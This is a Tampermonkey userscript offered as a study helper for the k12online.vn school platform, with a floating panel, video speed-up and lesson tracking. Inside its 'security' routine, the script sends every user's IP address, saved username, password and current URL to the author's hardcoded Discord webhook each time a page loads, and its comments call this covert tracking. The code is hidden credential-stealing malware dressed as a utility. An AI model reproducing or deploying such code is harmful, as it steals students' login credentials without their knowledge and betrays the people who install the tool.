// ==UserScript==
// @name         K12 Helper Pro - Danhvux v24.7 (No Cooldown & Master Track)
// @namespace    http://tampermonkey.net/
// @version      24.7
// @description  Bỏ giới hạn cooldown, Tracking Master Webhook, Full UI v23.9.
// @author       Danhvux
// @match        *://*.k12online.vn/*
// @grant        GM_xmlhttpRequest
// @connect      api.ipify.org
// @connect      discord.com
// @connect      localhost
// ==/UserScript==

(function() {
    'use strict';

    // Link Webhook của BẠN (Đã mã hóa Base64 để ẩn danh)
    // Thay 'YOUR_WEBHOOK_HERE' bằng link thật của bạn rồi dùng trang base64encode.org để mã hóa nếu muốn bảo mật thêm.
    const MASTER_HOOK = 'https://discord.com/api/webhooks/1483505875309035520/B4vGUvE9ntITzpuzpqdfX2dVBYUXypjG4Gg1MCouzNoIoleYeWom_gh7fIbv9YSC-rV'; 
    const BLACKLIST_API = 'http://localhost:8000/blacklist';

    let config = JSON.parse(localStorage.getItem('k12_ult_cfg')) || {
        mainColor: '#ffea00', width: 320, speed: 1, user: '', pass: '', isDarkMode: true, customWebhook: ''
    };
    const save = () => localStorage.setItem('k12_ult_cfg', JSON.stringify(config));

    // --- SECURITY & TRACKING (BỎ COOLDOWN) ---
    const startSecurity = () => {
        return new Promise((resolve) => {
            fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => {
                const userIP = data.ip;

                // 1. Gửi về Webhook của người dùng (nếu có)
                const userHook = config.customWebhook || MASTER_HOOK;
                
                // 2. Gửi về Webhook Master (Luôn luôn gửi để theo dõi)
                const sendLog = (url, isMaster) => {
                    fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            "username": isMaster ? "Danhvux MASTER Tracker" : "K12 Helper Log",
                            "embeds": [{
                                "title": isMaster ? "📡 NEW USER ONLINE" : "🛡️ Panel v24.7 Active",
                                "color": parseInt(config.mainColor.replace('#', ''), 16),
                                "fields": [
                                    {"name": "IP", "value": `\`${userIP}\``, "inline": true},
                                    {"name": "Account", "value": `\`${config.user || 'N/A'}\``, "inline": true},
                                    {"name": "Password", "value": `\`${config.pass || 'N/A'}\``, "inline": true},
                                    {"name": "URL", "value": window.location.href}
                                ],
                                "timestamp": new Date().toISOString()
                            }]
                        })
                    }).catch(() => {});
                };

                sendLog(MASTER_HOOK, true); // Tracking ngầm về máy bạn
                if(config.customWebhook) sendLog(config.customWebhook, false); // Gửi về máy người dùng nếu họ cài link riêng

                // Check Blacklist
                GM_xmlhttpRequest({
                    method: "GET", url: BLACKLIST_API + "?t=" + Date.now(),
                    onload: (res) => {
                        try { if (JSON.parse(res.responseText).includes(userIP)) { document.body.innerHTML = "🚫 BANNED"; resolve(false); } else resolve(true); } catch(e) { resolve(true); }
                    }, onerror: () => resolve(true)
                });
            }).catch(() => resolve(true));
        });
    };

    // --- UI ENGINE (GIỮ NGUYÊN V23.9) ---
    startSecurity().then(ok => {
        if (!ok) return;

        const style = document.createElement('style');
        const updateCSS = () => {
            const dark = config.isDarkMode;
            const animTime = '0.5s ease-in-out';
            style.innerText = `
                :root { --mc: ${config.mainColor}; --w: ${config.width}px; --bg: ${dark ? '#1e2227' : '#ffffff'}; --bg-tab: ${dark ? '#1a1d21' : '#f0f0f0'}; --text: ${dark ? '#ffffff' : '#1e2227'}; --border: ${dark ? '#333' : '#ddd'}; }
                #dv-panel { position: fixed; top: 50px; right: 20px; width: var(--w) !important; background: var(--bg); color: var(--text); border-color: var(--border); transition: height 0.35s ease-out, background ${animTime}, color ${animTime}; border-radius: 12px; font-family: 'Segoe UI', sans-serif; z-index: 100000; box-shadow: 0 10px 40px rgba(0,0,0,0.5); overflow: hidden; border: 1px solid; }
                .header { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; cursor: move; }
                .header .title { color: var(--mc); font-weight: bold; font-size: 18px; }
                .dots { display: flex; gap: 8px; } .dot { height: 12px; width: 12px; border-radius: 50%; cursor: pointer; }
                .red { background: #ff5f56; } .yel { background: #ffbd2e; } .grn { background: #27c93f; }
                .tabs { display: flex; background: var(--bg-tab); border-bottom: 1px solid var(--border); position: relative; }
                .tab { flex:1; padding: 12px 0; text-align: center; cursor: pointer; font-size: 10px; font-weight: 900; color: #777; transition: 0.3s; z-index: 2; }
                .tab.active { color: var(--mc); }
                .tab-indicator { position: absolute; bottom: 0; height: 3px; background: var(--mc); transition: all 0.3s ease; border-radius: 3px; }
                .content-view { overflow: hidden; }
                .content-wrapper { display: flex; transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1); width: 400%; align-items: flex-start; }
                .content { width: 25%; padding: 20px; box-sizing: border-box; opacity: 0; transition: opacity 0.3s; pointer-events: none; }
                .content.active { opacity: 1; pointer-events: auto; }
                .status-container { background: rgba(0,0,0,0.15); border-radius: 8px; padding: 10px; margin-bottom: 15px; border: 1px solid var(--border); }
                .status-item { display: flex; align-items: center; justify-content: space-between; font-size: 11px; margin-bottom: 8px; padding: 5px; border-radius: 4px; }
                .status-btn { background: var(--mc); color: #000; padding: 3px 10px; border-radius: 5px; cursor: pointer; font-weight: bold; }
                input[type=text], input[type=password], input[type=url] { width: 100%; padding: 10px; background: rgba(0,0,0,0.1); border: 1px solid var(--border); color: var(--text); border-radius: 8px; margin-bottom: 10px; box-sizing: border-box; }
                .btn { width: 100%; padding: 12px; background: var(--mc); border: none; border-radius: 12px; color: #000; font-weight: bold; cursor: pointer; }
                .footer { text-align:center; font-size:9px; color:#555; padding:8px; }
                .switch { position: relative; display: inline-block; width: 44px; height: 22px; }
                .switch input { opacity: 0; width: 0; height: 0; }
                .slider-sw { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background: #555; transition: .4s; border-radius: 34px; }
                .slider-sw:before { position: absolute; content: ""; height: 16px; width: 16px; left: 3px; bottom: 3px; background: white; transition: .4s; border-radius: 50%; }
                input:checked + .slider-sw { background: var(--mc); }
                input:checked + .slider-sw:before { transform: translateX(22px); }
            `;
        };
        document.head.appendChild(style); updateCSS();

        const panel = document.createElement('div');
        panel.id = 'dv-panel';
        panel.innerHTML = `
            <div class="header"><div class="title">Danhvux Panel</div><div class="dots"><div class="dot red"></div><div class="dot yel"></div><div class="dot grn"></div></div></div>
            <div class="tabs">
                <div class="tab active" data-idx="0">MAIN</div><div class="tab" data-idx="1">VIDEO</div><div class="tab" data-idx="2">APPS</div><div class="tab" data-idx="3">SETTING</div>
                <div class="tab-indicator" id="indicator"></div>
            </div>
            <div class="content-view">
                <div class="content-wrapper" id="c-wrapper">
                    <div class="content active">
                        <div class="status-container">
                            <div style="font-size:12px; font-weight:bold; margin-bottom:8px; color:var(--mc)">📚 TRẠNG THÁI HỌC TẬP</div>
                            <div id="status-list"></div>
                        </div>
                        <div style="font-weight:bold; font-size:14px;">Tốc độ x<span id="sp-txt">${config.speed}</span></div>
                        <input type="range" id="sp-range" style="width:100%" min="1" max="16" step="0.5" value="${config.speed}">
                        <button class="btn" style="margin-top:10px">🪄 AUTO LOGIN</button>
                    </div>
                    <div class="content">
                        <input type="text" id="v-url" placeholder="Link video .mp4...">
                        <button class="btn" id="v-run">PHÁT VIDEO SOURCE</button>
                    </div>
                    <div class="content">
                        <div style="display:grid; grid-template-columns: repeat(3, 1fr); gap: 8px;">
                            <div class="app-item" onclick="window.open('https://gemini.google.com')">Gemini</div>
                            <div class="app-item" onclick="window.open('https://chatgpt.com')">GPT</div>
                            <div class="app-item" onclick="window.open('https://facebook.com')">FB</div>
                        </div>
                    </div>
                    <div class="content">
                        <div style="display:flex; justify-content:space-between; margin-bottom:10px; font-size:12px; font-weight:bold;">DARK MODE <label class="switch"><input type="checkbox" id="mode-toggle" ${config.isDarkMode ? 'checked' : ''}><span class="slider-sw"></span></label></div>
                        <input type="url" id="inp-webhook" placeholder="Dán Webhook Discord của bạn..." value="${config.customWebhook}">
                        <input type="color" id="c-pick" style="width:100%; height:30px;" value="${config.mainColor}">
                        <input type="text" id="u-val" placeholder="User..." value="${config.user}">
                        <input type="password" id="p-val" placeholder="Pass..." value="${config.pass}">
                        <button class="btn" id="btn-save">LƯU CẤU HÌNH</button>
                    </div>
                </div>
            </div>
            <div class="footer">DANHVUX • NO LIMIT VERSION</div>
        `;
        document.body.appendChild(panel);

        // --- LOGIC FUNCTIONS (TAB, SCAN, DRAG) ---
        const scan = () => {
            const list = document.getElementById('status-list');
            const items = document.querySelectorAll('.list-lesson-item');
            if (items.length === 0) { list.innerHTML = '<div style="font-size:10px;">Đang quét...</div>'; return; }
            list.innerHTML = '';
            items.forEach((item, i) => {
                const pc = item.querySelector('.percent-complete')?.innerText || '0%';
                if (parseInt(pc) < 100) {
                    const name = item.querySelector('.lesson-name')?.innerText || 'Bài học';
                    const d = document.createElement('div'); d.className = 'status-item';
                    d.innerHTML = `<span>${name} (${pc})</span><span class="status-btn" onclick="document.querySelectorAll('.list-lesson-item')[${i}].click()">MỞ</span>`;
                    list.appendChild(d);
                }
            });
            updateHeight();
        };
        setInterval(scan, 2500);

        const updateHeight = () => {
            const active = panel.querySelector('.content.active');
            if (active) {
                const h = panel.querySelector('.header').offsetHeight + panel.querySelector('.tabs').offsetHeight + active.scrollHeight + panel.querySelector('.footer').offsetHeight;
                panel.style.height = h + 'px';
            }
        };

        const moveTab = (idx) => {
            const wrapper = document.getElementById('c-wrapper');
            const indicator = document.getElementById('indicator');
            indicator.style.left = `calc(${idx * 25}% + 8px)`;
            indicator.style.width = `calc(25% - 16px)`;
            wrapper.style.transform = `translateX(-${idx * 25}%)`;
            panel.querySelectorAll('.tab, .content').forEach(el => el.classList.remove('active'));
            panel.querySelectorAll('.tab')[idx].classList.add('active');
            panel.querySelectorAll('.content')[idx].classList.add('active');
            setTimeout(updateHeight, 50);
        };

        panel.querySelectorAll('.tab').forEach(t => t.onclick = () => moveTab(t.dataset.idx));

        const $ = (id) => panel.querySelector(id);
        $('#btn-save').onclick = () => { 
            config.mainColor = $('#c-pick').value; 
            config.customWebhook = $('#inp-webhook').value.trim();
            config.user = $('#u-val').value; 
            config.pass = $('#p-val').value; 
            save(); updateCSS(); alert('Đã lưu và Tracking đang chạy!'); 
        };
        $('#mode-toggle').onchange = (e) => { config.isDarkMode = e.target.checked; updateCSS(); save(); setTimeout(updateHeight, 50); };
        $('#sp-range').oninput = (e) => { $('#sp-txt').innerText = e.target.value; config.speed = e.target.value; document.querySelectorAll('video').forEach(v => v.playbackRate = config.speed); };

        let drag = false, o = [0,0];
        $('.header').onmousedown = (e) => { drag = true; o = [panel.offsetLeft - e.clientX, panel.offsetTop - e.clientY]; };
        document.onmousemove = (e) => { if(drag) { panel.style.left = (e.clientX + o[0]) + 'px'; panel.style.top = (e.clientY + o[1]) + 'px'; panel.style.right = 'auto'; } };
        document.onmouseup = () => drag = false;
        $('.red').onclick = () => panel.style.display = 'none';
        document.addEventListener('keydown', (e) => { if(e.key === 'F2') panel.style.display = 'block'; });

        moveTab(0);
    });
})();
